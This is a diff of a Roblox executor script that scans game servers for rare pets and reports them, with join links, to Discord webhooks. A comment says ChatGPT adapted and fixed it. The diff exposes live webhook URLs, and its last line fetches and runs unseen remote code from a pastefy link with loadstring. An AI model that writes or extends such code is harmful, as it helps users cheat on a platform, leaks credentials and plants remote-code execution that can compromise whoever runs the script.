@@ -1,4 +1,5 @@
--- 🐾 PET COMBINED NOTIFIER (Mutations + notifyPets en un script)
+-- 🐾 PET COMBINED NOTIFIER (Mutations + notifyPets)
+-- by AlexVM adaptado y corregido por ChatGPT
 
 --// Servicios
 local Players     = game:GetService("Players")
@@ -19,7 +20,7 @@ local Webhooks = {
 }
 
 --// Webhook general para notifyPets
-local DISCORD_WEBHOOK_NOTIFY = "https://discord.com/api/webhooks/1411323510164291634/5x4p7niAyMu5Dc5xnsGf-OYe8hvV3uoLjDHK7X8yT6g0xUe5KQfPErEWen1RMk8HfrRa"
+local DISCORD_WEBHOOK_NOTIFY = "https://discord.com/api/webhooks/1411918149204316251/btoM89F0PpjNYwL104SmabFwSiUUMAZNTqapFCc0eouHy9wr3TzYQJA4LmafUB6FSx4s"
 
 --// Mutaciones especiales: colores + emojis
 local MutationStyles = {
@@ -91,6 +92,9 @@ local notifyPets = {
     ["Yess my Examen"] = true,
 }
 
+--// Variable para evitar duplicados
+local detected = {}
+
 --// Compatibilidad con executors
 local function getRequestFunc()
     return (syn and syn.request)
@@ -104,7 +108,10 @@ end
 --// Enviar embed a Discord
 local function sendDiscordEmbed(webhook, args)
     local req = getRequestFunc()
-    if not req then return end
+    if not req then 
+        warn("❌ No se encontró función HTTP compatible.")
+        return 
+    end
     local payload = {
         embeds = {{
             title = args.title or "Evento",
@@ -121,6 +128,7 @@ local function sendDiscordEmbed(webhook, args)
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
     })
+    print("✅ Enviado a Discord:", args.title)
 end
 
 -------------------------------------------------------------------------------------------------
@@ -130,9 +138,8 @@ local function sendMutation(petName, mutKey, generationText, pos)
     local style = MutationStyles[mutKey]
     local webhook = Webhooks[mutKey]
     if not style or not webhook then return end
-    local mutationLabel = string.format("🧬 %s %s %s", style.emoji, mutKey:upper(), style.emoji)
 
-    -- ✅ Link actualizado
+    local mutationLabel = string.format("🧬 %s %s %s", style.emoji, mutKey:upper(), style.emoji)
     local serverLink = string.format(
         "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
         tostring(game.PlaceId),
@@ -163,8 +170,6 @@ end
 -------------------------------------------------------------------------------------------------
 local function sendNotifyPet(petModel, mutationText, generationText)
     local pos = petModel.PrimaryPart and petModel.PrimaryPart.Position or Vector3.new()
-
-    -- ✅ Link actualizado
     local serverLink = string.format(
         "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
         tostring(game.PlaceId),
@@ -188,51 +193,40 @@ local function sendNotifyPet(petModel, mutationText, generationText)
 end
 
 -------------------------------------------------------------------------------------------------
--- ESCANEO DE SERVIDOR
+-- 3) ESCANEO DE SERVIDOR
 -------------------------------------------------------------------------------------------------
 local function scanPets()
     local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return end
+    if plots then
+        for _, plot in ipairs(plots:GetChildren()) do
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in ipairs(podiums:GetChildren()) do
+                    local base = podium:FindFirstChild("Base")
+                    local spawn = base and base:FindFirstChild("Spawn")
+                    local attachment = spawn and spawn:FindFirstChild("Attachment")
+                    local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
 
-    for _, plot in ipairs(plots:GetChildren()) do
-        local podiums = plot:FindFirstChild("AnimalPodiums")
-        if podiums then
-            for _, podium in ipairs(podiums:GetChildren()) do
-                local base = podium:FindFirstChild("Base")
-                local spawn = base and base:FindFirstChild("Spawn")
-                local attachment = spawn and spawn:FindFirstChild("Attachment")
-                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+                    if overhead then
+                        local displayName = overhead:FindFirstChild("DisplayName")
+                        local mutation = overhead:FindFirstChild("Mutation")
+                        local generation = overhead:FindFirstChild("Generation")
 
-                if overhead then
-                    local displayName = overhead:FindFirstChild("DisplayName")
-                    local mutation = overhead:FindFirstChild("Mutation")
-                    local generation = overhead:FindFirstChild("Generation")
+                        if displayName and displayName:IsA("TextLabel") then
+                            local name = displayName.Text
+                            local mutText = (mutation and mutation.Text) or "Normal"
+                            local genText = (generation and generation.Text) or "?"
 
-                    if displayName and displayName:IsA("TextLabel") then
-                        local name = displayName.Text
-                        local mutText = (mutation and mutation.Text) or "Normal"
-                        local genText = (generation and generation.Text) or "?"
-
-                        -- Caso 1: mutaciones
-                        if mutText ~= "" and mutText ~= "Normal" then
-                            for key, _ in pairs(MutationStyles) do
-                                if key == "YinYang" then
-                                    if string.find(mutText:lower(), "yin") and string.find(mutText:lower(), "yang") then
-                                        sendMutation(name, key, genText, spawn.Position)
-                                    end
-                                else
-                                    if string.find(mutText:lower(), key:lower()) then
+                            if mutText ~= "" and mutText ~= "Normal" then
+                                for key, _ in pairs(MutationStyles) do
+                                    if key == "YinYang" then
+                                        if string.find(mutText:lower(), "yin") and string.find(mutText:lower(), "yang") then
+                                            sendMutation(name, key, genText, spawn.Position)
+                                        end
+                                    elseif string.find(mutText:lower(), key:lower()) then
                                         sendMutation(name, key, genText, spawn.Position)
                                     end
                                 end
-                            end
-                        end
-
-                        -- Caso 2: pets de notifyPets
-                        for _, obj in ipairs(Workspace:GetDescendants()) do
-                            if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
-                                detected[obj] = true
-                                sendNotifyPet(obj, mutText, genText)
                             end
                         end
                     end
@@ -240,18 +234,25 @@ local function scanPets()
             end
         end
     end
+
+    -- 🧠 Escaneo de notifyPets (fuera del bucle)
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
+            detected[obj] = true
+            sendNotifyPet(obj, "Normal", "?")
+        end
+    end
 end
 
--- Escaneo inmediato
+-- Escaneo inmediato y cada 10 segundos
 pcall(scanPets)
-
--- Escaneo cada 10 segundos
 task.spawn(function()
     while task.wait(10) do
         pcall(scanPets)
     end
 end)
 
-print("✅ Script combinado cargado (Mutations + notifyPets).")
+print("✅ Script combinado cargado correctamente (Mutations + notifyPets).")
 
-loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))()
+-- Script adicional remoto (si es necesario)
+loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
